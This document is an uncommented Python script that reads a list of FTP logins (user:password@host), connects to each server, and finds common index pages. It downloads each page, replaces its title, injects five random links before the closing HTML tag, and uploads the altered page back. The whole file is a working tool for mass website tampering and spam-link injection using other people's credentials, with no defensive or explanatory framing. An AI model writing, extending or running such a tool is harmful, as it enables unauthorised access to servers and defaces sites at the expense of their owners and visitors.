# -*- coding=utf-8 -*-
from ftplib import FTP
from random import randint
import os

def getNewitem(lines):
	random = randint(0, len(lines)-1)
	newitem = lines[random]
	return newitem

def getRandomLinks(lines):
	links = []
	for x in range(0, 5):
		newitem = getNewitem(lines)
		links.append(newitem)
	return links

def getCredential(line):
	chunk = line.rsplit(':')
	user = chunk[0]
	chunk = chunk[1].rsplit('@')
	password = chunk[0]
	url = chunk[1]
	data = [url, user, password]
	return data

def ftpconnect(host, username, password):
    ftp = FTP()
    # ftp.set_debuglevel(2)
    ftp.connect(host)
    ftp.login(username, password)
    print('CONN:' + host)
    return ftp

def downloadfile(ftp, remotepath, localpath):
    bufsize = 1024
    fp = open(localpath, 'wb')
    ftp.retrbinary('RETR ' + remotepath, fp.write, bufsize)
    fp.close()

def uploadfile(ftp, remotepath, localpath):
    bufsize = 1024
    fp = open(localpath, 'rb')
    ftp.storbinary('STOR ' + remotepath, fp, bufsize)
    fp.close()


def replaceTitle(fullhtml, newtitle):
    begin = fullhtml.find("<title>")
    end = fullhtml.find("/title")
    # end = s.index("/title")
    old = fullhtml[begin+7:end-1]
    newhtml = fullhtml.replace(old, newtitle)
    return newhtml

def insertHTML(fullhtml, links):
    new = '\n'.join(links)
    new += '\n</html>'
    old = "</html>"
    newhtml = fullhtml.replace(old, new)
    return newhtml
    

def edit(filename, title, links):
    file = open(filename, 'r+')
    htmllist = file.readlines()
    fullhtml = ''.join(htmllist)

    newhtml = replaceTitle(fullhtml, title)
    newhtml = insertHTML(newhtml, links)

    file.seek(0)
    file.truncate()
    file.write(newhtml)
    file.close()

def readtarget(filename):
    file = open(filename, 'r')
    line = file.read().splitlines()
    return line


listTitle = open('title.txt', 'r').readlines()
listLink = open('link.txt', 'r').readlines()

arrFTP = readtarget('credential.txt')
for item in arrFTP:
    ftpCred = getCredential(item)

    # MAY FAIL
    ftp = ftpconnect(ftpCred[0], ftpCred[1], ftpCred[2])

    bufsize=1024
    # ftp.set_debuglevel(1)
    # ftp.dir()
    ftp.cwd('web')

    arrTargetFile = ["default.asp", "index.htm", "index.html", "index.asp", "index.aspx"]

    for target in arrTargetFile:
    	if(target in ftp.nlst()):
    		print("FOUND: " + target)
    		newlinks=getRandomLinks(listLink)
    		downloadfile(ftp, target, os.path.dirname(__file__) + target)                
    		edit(target, getNewitem(listTitle), newlinks)
    		uploadfile(ftp, target, os.path.dirname(__file__) + target)

    ftp.quit()